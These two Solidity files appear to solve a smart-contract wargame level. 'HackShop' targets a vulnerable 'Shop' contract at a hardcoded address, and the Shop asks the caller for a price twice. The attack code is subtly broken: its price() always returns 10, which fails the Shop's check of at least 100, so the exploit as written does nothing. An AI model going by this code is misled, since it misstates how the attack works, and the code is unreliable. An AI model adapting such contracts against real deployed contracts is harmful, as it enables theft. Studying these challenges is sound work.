// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/Shop.sol';

contract HackShop is Buyer {

    Shop public originalContract = Shop(0x0BbDBDE0B147fbDcb5e24A7783280f427A12A11A);

    function hack() public {
        originalContract.buy();
    }

    function price() public view override returns (uint) {
        return 10;
    }

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}